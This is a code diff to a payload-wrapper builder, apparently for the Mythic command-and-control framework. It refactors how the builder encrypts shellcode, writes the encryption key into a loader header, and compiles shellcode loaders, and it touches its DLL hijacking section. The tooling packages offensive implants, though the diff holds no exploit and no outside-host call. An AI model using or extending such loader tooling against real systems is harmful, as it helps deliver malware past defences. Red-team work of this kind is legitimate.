@@ -94,7 +94,6 @@ class ErebusWrapper(PayloadType):
 
     wrapper = True
     wrapped_payloads = []
-    supports_dynamic_loading = True
     c2_profiles = []
 
     agent_type = AgentType.Wrapper
@@ -370,12 +369,11 @@ generated if none have been entered.""",
 
             shellcode_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader"
             clickonce_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.ClickOnce"
-
             encryption_key_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "key.hpp"
-            encryption_key_path = str(encryption_key_path)
 
             shellcode_loader_path = str(shellcode_loader_path)
             clickonce_loader_path = str(clickonce_loader_path)
+            encryption_key_path = str(encryption_key_path)
 
             shellcrypt_path = PurePath(agent_build_path) / "shellcrypt" / "shellcrypt.py"
             shellcrypt_path = str(shellcrypt_path)
@@ -440,11 +438,13 @@ generated if none have been entered.""",
             ))
 
             cmd = [
-                "python", shellcrypt_path,
+                "python",
+                shellcrypt_path,
                 "-i", mythic_shellcode_path,
                 "-e", ENCRYPTION_METHODS[self.get_parameter("Encryption Type")],
                 "-f", SHELLCODE_FORMAT[self.get_parameter("Shellcode Format")],
             ]
+
             if self.get_parameter("Shellcode Format") != "Raw":
                 cmd += ["-a", self.get_parameter("Shellcode Array Name")]
 
@@ -475,20 +475,28 @@ generated if none have been entered.""",
                 if self.get_parameter("Shellcode Format") == "Raw":
                     # Get the encryption key in C format to be used within the loader and other functions
                     cmd = [
-                        "python", shellcrypt_path,
+                        "python",
+                        shellcrypt_path,
                         "-i", mythic_shellcode_path,
                         "-e", ENCRYPTION_METHODS[self.get_parameter("Encryption Type")],
-                        "-f", "c",
+                        "-f",
+                        "c",
+                        "-a",
+                        "shellcode"
                     ]
 
                     if self.get_parameter("Encryption Key") != "NONE":
                         cmd += ["-k", self.get_parameter("Encryption Key")]
 
                     key_src = subprocess.check_output(cmd, text=True)
-                    start = key_src.find("unsigned char key[]")
+                    output += key_src
+
+                    start = key_src.find("unsigned char key")
                     end   = key_src.find("};", start) + 2
                     key_array = key_src[start:end]
-                    with open(encryption_key_path, "w") as file:
+                    output += key_array
+
+                    with open(encryption_key_path, "w+") as file:
                         file.write(key_array)
 
                     # response.payload = open(obfuscated_shellcode_path, "rb").read()
@@ -541,8 +549,10 @@ generated if none have been entered.""",
                 return response
             output = ""
 
+
             ######################### DLL Hijacking Section #########################
-            if self.get_parameter("Main Payload Type") is "Hijack":
+            if self.get_parameter("Main Payload Type") == "Hijack":
+                print(f'User Selected: {self.get_parameter("Main Payload Type")}')
 
                 file_content = await getFileFromMythic(
                     agentFileId=self.get_parameter("DLL Hijacking")
@@ -667,7 +677,8 @@ generated if none have been entered.""",
                 output = ""
             ######################### End Of DLL Hijacking Section #########################
             ######################### Shellcode Loader Section #########################
-            if self.get_parameter("Main Payload Type") is "Loader":
+            if self.get_parameter("Main Payload Type") == "Loader":
+                print(f'User Selected: {self.get_parameter("Main Payload Type")}')
 
                 shutil.copy(dst=f"{shellcode_loader_path}/erebus.bin", src=obfuscated_shellcode_path)
 
@@ -675,16 +686,30 @@ generated if none have been entered.""",
                 payload_path = str(payload_path)
 
                 cmd = [
-                    "make",
-                    "-C",
+                    "cmake",
+                    "-S",
                     shellcode_loader_path,
+                    "-B"
+                    "build"
                 ]
-                proc = await asyncio.create_subprocess_exec(
+                process = await asyncio.create_subprocess_exec(
                     *cmd,
                     stdout=asyncio.subprocess.PIPE,
                     stderr=asyncio.subprocess.PIPE,
                 )
-                stdout, stderr = await proc.communicate()
+                stdout, stderr = await process.communicate()
+
+                cmd = [
+                    "cmake",
+                    "--build",
+                    f"{shellcode_loader_path}/build"
+                ]
+                process = await asyncio.create_subprocess_exec(
+                    *cmd,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                )
+                stdout, stderr = await process.communicate()
 
                 if stdout:
                     output += f"[stdout]\n{stdout.decode()}"
@@ -694,7 +719,6 @@ generated if none have been entered.""",
                 if os.path.exists(payload_path):
                     # Debug
                     # response.payload = open(payload_path, "rb").read()
-
                     response.status = BuildStatus.Success
                     response.build_message = "Loader Compiled!"
                     response.build_stdout = output + "\n" + payload_path
